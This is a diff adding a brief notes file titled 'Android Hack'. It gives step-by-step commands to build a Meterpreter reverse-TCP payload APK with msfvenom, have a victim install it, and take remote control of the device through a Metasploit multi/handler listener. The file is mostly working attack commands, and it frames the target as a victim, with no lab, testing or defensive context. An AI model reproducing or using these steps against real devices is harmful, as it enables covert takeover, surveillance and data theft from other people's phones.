@@ -1,0 +1,29 @@
+Android Hack
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST= LPORT=8888 R> hexworm.apk
+
+MsfVenom- a Metasploit Standalone payload generator. Also a replacement for msfpayload and msfencode.
+
+-p = Payload to use
+
+Send .apk file to victim's android device
+
+once .apk installed
+
+msfconsole
+
+use multi/handler
+
+set payload android/meterpreter/reverse_tcp
+
+show options
+
+set LHOST
+
+set LPORT
+
+exploit
+
+we will have meterpreter access
+
+type help to see a list of command to execute.
